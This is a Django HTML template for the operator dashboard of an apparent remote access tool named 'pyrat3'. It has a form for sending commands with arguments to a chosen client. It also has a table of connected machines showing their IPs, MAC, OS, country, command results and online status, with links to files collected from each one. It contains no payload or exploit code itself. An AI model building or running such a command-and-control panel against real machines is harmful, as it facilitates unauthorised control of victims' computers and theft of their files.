<!DOCTYPE html>
<html lang="en">
<head>
    {% load static %}
    {% load user_tags %}
    <meta charset="UTF-8">
    <link rel="stylesheet" href="{% static 'css/styles.css' %}">
    <title>pyrat3 :: home</title>
    <script src="https://code.jquery.com/jquery-3.4.0.min.js"
            integrity="sha256-BJeo0qm959uMBGb65z40ejJYGSgR7REI4+CW1fNKwOg="
            crossorigin="anonymous">
    </script>
</head>
<body>
    <div id="header_area" class="header-area">
        <pre>


 ______   __  __     ______     ______     ______
/\  == \ /\ \_\ \   /\  == \   /\  __ \   /\__  _\
\ \  _-/ \ \____ \  \ \  __<   \ \  __ \  \/_/\ \/
 \ \_\    \/\_____\  \ \_\ \_\  \ \_\ \_\    \ \_\
  \/_/     \/_____/   \/_/ /_/   \/_/\/_/     \/_/


        </pre>
    </div>

        <form method="POST" >
            <div id="form_area" class="form-area">
                {% csrf_token %}
                {{ form.non_field_errors }}
                {{ form.source.errors }}
                {{ form.source }}
                <div id="form_area_last_command_id_field" class="form-area-last-command-id-field">
                    {{ form.last_command_id.label_tag }}
                    {{ form.last_command_id.errors }}
                    {{ form.last_command_id }}
                </div>
                <div id="form_area_client_id_field" class="form-area-client-id-field">
                    {{ form.client_id.label_tag }}
                    {{ form.client_id.errors }}
                    {{ form.client_id }}
                </div>
                <div id="form_area_last_command_field" class="form-area-last-command-field">
                    {{ form.last_command.label_tag }}
                    {{ form.last_command.errors }}
                    {{ form.last_command }}
                </div>
                <div id="form_area_last_command_args_field" class="form-area-last-command-args-field">
                    {{ form.last_command_args.label_tag }}
                    {{ form.last_command_args.errors }}
                    {{ form.last_command_args }}
                </div>
            </div>
            <button class="send-command" type="submit">GO!</button>
        </form>

    <table class="client-table">
        <tr>
            <th>Pos</th>
            <th>Client id</th>
            <th>PC UUID</th>
            <th>Join date</th>
            <th>MAC</th>
            <th>OS</th>
            <th>Name</th>
            <th>Ext IP</th>
            <th>Int IP</th>
            <th>Country</th>
            <th>Last command ID</th>
            <!-- <th>Last command date/time</th> -->
            <th>Last command</th>
            <th>Last command args</th>
            <th>Last command result</th>
            <!-- <th>Last command result date/time</th> -->
            <th>Ping</th>
            <th>Status</th>
            <th>Files</th>
        </tr>
        {% for client in clients %}
        <tr>
            <td>{{ forloop.counter }}</td>
            <td>{{ client.client_id }}</td>
            <td>{{ client.pc_uuid }}</td>
            <td>{{ client.join_datetime|date:"Y-m-d H:i:s" }}</td>
            <td>{{ client.mac }}</td>
            <td>{{ client.os }}</td>
            <td>{{ client.name }}</td>
            <td>{{ client.ext_ip }}</td>
            <td>{{ client.int_ip }}</td>
            <td>{{ client.country }}</td>
            <td>{{ client.last_command_id }} ({{ client.last_command_datetime|date:"Y-m-d H:i:s" }})</td>
            <td>{{ client.last_command }}</td>
            <td>{{ client.last_command_args }}</td>
            <td>{{ client.last_command_result|linebreaks }}</td>
            <!-- <td>{{ client.last_command_result_datetime }}</td> -->
            {% with client.last_activity_datetime|timediff as ping %}
            <td>
                {% if ping < 16 %}
                <span class="green">{{ ping }}</span>
                {% elif ping < 100 %}
                <span class="orange">{{ ping }}</span>
                {% else %}
                <span class="red">Offline</span>
                {% endif %}
            </td>
            <td>
                {% if client.last_command_id in client.last_command_result and ping < 16  %}
                IDDLE
                {% elif ping > 100 %}
                ------
                {% else %}
                WORKING
                {% endif %}
            </td>
            {% endwith %}
            <td><a href="/media/{{ client.client_id }}/">FILES</a></td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>